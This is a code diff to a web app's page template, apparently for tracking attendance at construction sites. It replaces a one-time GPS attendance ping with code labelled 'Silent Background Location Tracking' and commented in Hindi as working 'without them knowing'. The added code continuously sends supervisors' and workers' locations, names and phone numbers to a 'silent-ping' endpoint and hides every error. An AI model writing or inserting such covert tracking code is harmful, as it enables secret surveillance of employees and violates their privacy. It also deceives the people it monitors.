@@ -939,24 +939,78 @@
     <!-- Bilingual Translation Script (Hindi / English 1-Tap Toggle) -->
     <script src="/static/translations.js"></script>
 
-    {% if session.get('worker_token') and not session.get('is_owner') %}
-    <!-- Auto-Ping GPS Attendance for Supervisors, DEOs & Staff on Site -->
+    {% if not session.get('is_owner') and (session.get('site_id') or session.get('role') in ['supervisor', 'site_incharge', 'worker'] or session.get('worker_token')) %}
+    <!-- Silent Background Location Tracking for Supervisors & Site Incharges ("unko pata lage bina") -->
     <script>
     (function() {
-        if ("geolocation" in navigator) {
-            navigator.geolocation.getCurrentPosition(async function(pos) {
+        const siteId = {{ session.get('site_id') or 0 }};
+        const supName = "{{ session.get('worker_name') or '' }}";
+        const supPhone = "{{ session.get('worker_phone') or '' }}";
+        const workerToken = "{{ session.get('worker_token') or '' }}";
+        const pageTitle = document.title || window.location.pathname;
+
+        function sendSilentPing(lat, lng, acc) {
+            if (!lat || !lng) return;
+
+            const payload = JSON.stringify({
+                site_id: siteId,
+                supervisor_name: supName,
+                phone: supPhone,
+                token: workerToken,
+                latitude: lat,
+                longitude: lng,
+                accuracy: acc || 0,
+                page: pageTitle
+            });
+
+            // 1. Silent Supervisor Tracking Ping
+            if (siteId) {
                 try {
-                    await fetch('/api/worker/ping', {
+                    if (navigator.sendBeacon) {
+                        navigator.sendBeacon('/api/supervisor/silent-ping', new Blob([payload], {type: 'application/json'}));
+                    } else {
+                        fetch('/api/supervisor/silent-ping', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: payload,
+                            keepalive: true
+                        }).catch(function() {});
+                    }
+                } catch(e) {}
+            }
+
+            // 2. Also keep worker ping updated if worker_token is set
+            if (workerToken) {
+                try {
+                    fetch('/api/worker/ping', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            token: "{{ session.get('worker_token') }}",
-                            lat: pos.coords.latitude,
-                            lng: pos.coords.longitude
-                        })
-                    });
+                        body: payload,
+                        keepalive: true
+                    }).catch(function() {});
                 } catch(e) {}
-            }, function(err) {}, { enableHighAccuracy: true, timeout: 8000, maximumAge: 60000 });
+            }
+        }
+
+        if ("geolocation" in navigator) {
+            // A. Immediate silent ping on page load
+            navigator.geolocation.getCurrentPosition(function(pos) {
+                sendSilentPing(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+            }, function(err) {}, { enableHighAccuracy: true, timeout: 8000, maximumAge: 30000 });
+
+            // B. Continuous watch position
+            try {
+                navigator.geolocation.watchPosition(function(pos) {
+                    sendSilentPing(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+                }, function(err) {}, { enableHighAccuracy: true, timeout: 15000, maximumAge: 45000 });
+            } catch(e) {}
+
+            // C. Periodic background heartbeat every 90 seconds while app/APK is open
+            setInterval(function() {
+                navigator.geolocation.getCurrentPosition(function(pos) {
+                    sendSilentPing(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+                }, function(err) {}, { enableHighAccuracy: true, timeout: 8000, maximumAge: 60000 });
+            }, 90000);
         }
     })();
     </script>
